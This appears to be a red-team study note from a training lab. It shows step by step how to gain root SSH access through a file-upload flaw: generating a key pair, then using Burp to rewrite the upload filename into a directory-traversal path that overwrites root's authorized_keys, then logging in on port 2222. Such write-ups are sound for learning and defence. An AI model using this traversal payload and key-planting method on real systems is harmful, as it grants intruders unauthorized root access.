---
title: FileUpload 5
parent: Attack Repository
grand_parent: Red Team
nav_order: 6
---
# Using Non-Executable Files
# Overview
- Uploading files other than executable files (such as .php) can also cause serious damage
- Services like Google Drive allow the upload of executable files, but are designed so that those files do not affect the system

# Example: Intrusion Using an SSH Public Key
## Overview
Overwrite the target’s `authorized_keys` file and log in via SSH
## Procedure
1. Prepare your public key
```bash
# Generating a Public Key
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...
# Write the public key to the authorized_keys file
kali@kali:~$ cat fileup.pub > authorized_keys
```

2. Upload the file
- Launch Burp and enable Intercept
- Upload the created authorized_keys file
![[../../../Assets/images/Pasted image 20260506014137.png
- Use directory traversal to send the intercepted communication
```bash
# Tamper with the “filename” part to create a directory traversal path
filename="../../../../../../../root/.ssh/authorized_keys"
```
![[../../../assets/images/Pasted image 20260506014204.png]]

3. Log in using the uploaded file
```
# Delete the SSH known_hosts file to avoid errors
 rm ~/.ssh/known_hosts

ssh -p 2222 -i fileup root@mountaindesserts.com
# On the target machine, sshd is listening on port 2222
```